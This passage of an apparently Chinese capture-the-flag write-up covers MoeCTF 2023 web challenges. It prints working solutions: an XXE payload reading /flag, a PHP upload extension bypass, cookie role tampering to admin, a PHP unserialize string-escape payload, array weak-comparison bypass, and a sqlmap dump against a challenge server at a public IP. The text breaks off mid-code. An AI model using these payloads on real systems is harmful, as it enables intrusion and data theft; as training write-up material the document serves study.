class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;steering_control&quot;</span>:fx,<span class="hljs-string">&quot;throttle&quot;</span>:sd&#125;<br>re=session.post(url=url,data=data)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;向左&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;向右&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;弯道直行&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      fx=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;抓地力太小了&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;抓地力太大了&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;保持这个速度&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>      sd=<span class="hljs-number">1</span><br>    soup = BeautifulSoup(re.content, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>    info_div = soup.find(<span class="hljs-string">&quot;div&quot;</span>, &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-string">&quot;info&quot;</span>&#125;)<br>    <span class="hljs-built_in">print</span>(info_div.text)<br>    data=&#123;<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;steering_control&quot;</span>:fx,<span class="hljs-string">&quot;throttle&quot;</span>:sd&#125;<br>    re=session.post(url=url,data=data)<br>    <span class="hljs-built_in">print</span>(data)<br>    <br></code></pre></td></tr></table></figure>

<h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p><img src="/mdimg/moectf2023/24.png" srcset="/img/loading.gif" lazyload><br>只检测文件后缀第一个点后面的，xxx.png.php就行</p>
<h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p><img src="/mdimg/moectf2023/25.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>注册一个新账号然后登录得到token<br><img src="/mdimg/moectf2023/26.png" srcset="/img/loading.gif" lazyload><br>base64decode之后把role：user<br>改成admin,base64encode上传即可</p>
<h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><p><img src="/mdimg/moectf2023/27.png" srcset="/img/loading.gif" lazyload><br>bp爆破<br><img src="/mdimg/moectf2023/28.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;localhost:52776&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;multipart/form-data; boundary=---------------------------15719226131077920622631907538&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>,<br>    <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>    <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="hljs-string">&#x27;document&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="hljs-string">&#x27;navigate&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="hljs-string">&#x27;cross-site&#x27;</span>,<br>    <span class="hljs-string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="hljs-string">&#x27;?1&#x27;</span>,<br>&#125;<br><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;-----------------------------15719226131077920622631907538</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;xml_content&quot;</span><br><span class="hljs-string">Content-Type: text/xml</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-string">&lt;!DOCTYPE a[</span><br><span class="hljs-string">    &lt;!ENTITY b SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;xml&gt;&lt;name&gt;&amp;b;&lt;/name&gt;&lt;/xml&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------15719226131077920622631907538--</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>response = requests.post(<span class="hljs-string">&#x27;http://localhost:62103/&#x27;</span>, headers=headers, data=data)<br><br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>
<h3 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h3><p><img src="/mdimg/moectf2023/29.png" srcset="/img/loading.gif" lazyload><br>加个gif头就能上传<br>发现可以上传php<br>但是不知道目录<br>一直尝试也访问不到木马<br>换思路<br><code>images.php</code>能读文件，拿来读flag<br><img src="/mdimg/moectf2023/30.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/31.png" srcset="/img/loading.gif" lazyload><br>弱比较数组绕过<br><code>?param1[]=1&amp;param2[]=2</code></p>
<h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;Hanxin.exe.php&#x27;</span>);<br><br><span class="hljs-variable">$Chant</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;chant&#x27;</span>] : <span class="hljs-string">&#x27;夺命十三枪&#x27;</span>;<br><br><span class="hljs-variable">$new_visitor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="hljs-variable">$Chant</span>);<br><br><span class="hljs-variable">$before</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$new_visitor</span>);<br><span class="hljs-variable">$after</span> = <span class="hljs-title class_">Deadly_Thirteen_Spears</span>::<span class="hljs-title function_ invoke__">Make_a_Move</span>(<span class="hljs-variable">$before</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Movements: &#x27;</span> . <span class="hljs-variable">$after</span> . <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><br><span class="hljs-keyword">try</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$after</span>);<br>&#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Even Caused A Glitch...&quot;</span>;<br>&#125;<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-keyword">__FILE__</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Deadly_Thirteen_Spears</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Lovesickness&quot;</span>,<br>        <span class="hljs-string">&quot;di_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Heartbreak&quot;</span>,<br>        <span class="hljs-string">&quot;di_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Blind_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_si_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Romantic_charm&quot;</span>,<br>        <span class="hljs-string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Peerless&quot;</span>,<br>        <span class="hljs-string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;White_Dragon&quot;</span>,<br>        <span class="hljs-string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Penetrating_Gaze&quot;</span>,<br>        <span class="hljs-string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Kunpeng&quot;</span>,<br>        <span class="hljs-string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Overlord&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Letting_Go&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Decisive_Victory&quot;</span>,<br>        <span class="hljs-string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="hljs-string">&quot;Unrepentant_Lethality&quot;</span><br>    );<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Make_a_Move</span>(<span class="hljs-params"><span class="hljs-variable">$move</span></span>)</span>&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$index</span> =&gt; <span class="hljs-variable">$movement</span>)&#123;<br>            <span class="hljs-variable">$move</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$index</span>, <span class="hljs-variable">$movement</span>, <span class="hljs-variable">$move</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$move</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Chant</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Spear_Owner</span> = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$chant</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Chant = <span class="hljs-variable">$chant</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;Spear_Owner = <span class="hljs-string">&#x27;Nobody&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;Spear_Owner !== <span class="hljs-string">&#x27;MaoLei&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Far away from COOL...&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>通过<code>__toString()</code>满足if读flag<br><img src="/mdimg/moectf2023/32.png" srcset="/img/loading.gif" lazyload><br><code>Make_a_Move</code>方法替换序列化之后的字符<br><code>di_jiu_qiang</code>长度12 替换为：<code>string(32) &quot;Night_Parade_of_a_Hundred_Ghosts&quot;</code>逃逸20<br>可以看到替换后Chant属性的字符长度没变<br>可以字符串逃逸<br><code>string(35) &quot;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;</code><br>需要逃逸35个字符<br><code>di_shi_san_qiang</code>16 –&gt;    <code>string(21) &quot;Unrepentant_Lethality&quot;</code>逃逸5<br>payload：<code>?chant=di_jiu_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></p>
<h3 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h3><p><img src="/mdimg/moectf2023/33.png" srcset="/img/loading.gif" lazyload><br><code>[http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php](http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php)</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Visitor auto recorder</span><br><span class="hljs-comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span><br><span class="hljs-comment">Author: KoKoMi</span><br><span class="hljs-comment">  Still in development! :)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 不许偷看！这些代码我还在调试呢！</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// 加载数据库配置，暂时用硬编码绝对路径</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="hljs-string">&#x27;wp-config.php&#x27;</span>);<br><br><span class="hljs-variable">$db_user</span> = DB_USER; <span class="hljs-comment">// 数据库用户名</span><br><span class="hljs-variable">$db_password</span> = DB_PASSWORD; <span class="hljs-comment">// 数据库密码</span><br><span class="hljs-variable">$db_name</span> = DB_NAME; <span class="hljs-comment">// 数据库名称</span><br><span class="hljs-variable">$db_host</span> = DB_HOST; <span class="hljs-comment">// 数据库主机</span><br><br><span class="hljs-comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span><br><span class="hljs-comment">// 这些是临时的代码</span><br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$user_agent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;time&#x27;</span>]);<br><br><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_password</span>, <span class="hljs-variable">$db_name</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;connect_errno) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接失败: &#x27;</span> . <span class="hljs-variable">$mysqli</span>-&gt;connect_error;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="hljs-subst">$ip</span>&#x27;, &#x27;<span class="hljs-subst">$user_agent</span>&#x27;, <span class="hljs-subst">$time</span>)&quot;</span>;<br><br><span class="hljs-comment">// 执行插入</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>, <span class="hljs-variable">$query</span>);<br><br><span class="hljs-comment">// 检查插入是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入成功&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysqli</span>);<br>&#125;<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$mysqli</span>);<br><br><span class="hljs-comment">//gpt真好用</span><br>数据插入失败: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="hljs-keyword">for</span> the right syntax to <span class="hljs-keyword">use</span> <span class="hljs-title">near</span> &#x27;)&#x27; <span class="hljs-title">at</span> <span class="hljs-title">line</span> 1<br></code></pre></td></tr></table></figure>
<p><code>sqlmap -r 1.txt --batch -D wordpress -T secret_of_kokomi  -C content --dump</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /wordpress/wp-content/plugins/visitor-logging/logger.php?http:%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<span class="hljs-number">101.42.178.83:7770</span>%<span class="hljs-number">2</span>fwordpress%<span class="hljs-number">2</span>fwp-content%<span class="hljs-number">2</span>fplugins%<span class="hljs-number">2</span>fvisitor-logging%<span class="hljs-number">2</span>flogger.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">101.42.178.83:7770</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">117</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">24</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">101.42.178.83:7770</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">101.42.178.83:7770</span>/wordpress/wp-content/plugins/visitor-logging/logger.php<br><span class="hljs-attribute">Cookie</span>: comment_author_4c9aa5fddaa9877c73e1c45596fe15bd=a; comment_author_email_4c9aa5fddaa9877c73e1c45596fe15bd=a%<span class="hljs-number">40</span>a.com; comment_author_url_4c9aa5fddaa9877c73e1c45596fe15bd=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fa.com; wordpress_test_cookie=WP%<span class="hljs-number">20</span>Cookie%<span class="hljs-number">20</span>check<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">ip</span>=<span class="hljs-number">1</span>&amp;user_agent=<span class="hljs-number">2</span>&amp;time=<span class="hljs-number">3</span><br><br></code></pre></td></tr></table></figure>
<p><img src="/mdimg/moectf2023/34.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> users, salt<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> http.server<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    FLAG = f.read().strip()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gethash</span>(<span class="hljs-params">*items</span>):      <span class="hljs-comment"># *items形参元组      </span><br>    c = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-keyword">if</span> item <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        c ^= <span class="hljs-built_in">int</span>.from_bytes(hashlib.md5(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="hljs-string">&quot;big&quot;</span>)   <span class="hljs-comment"># it looks so complex! but is it safe enough?</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hex</span>(c)[<span 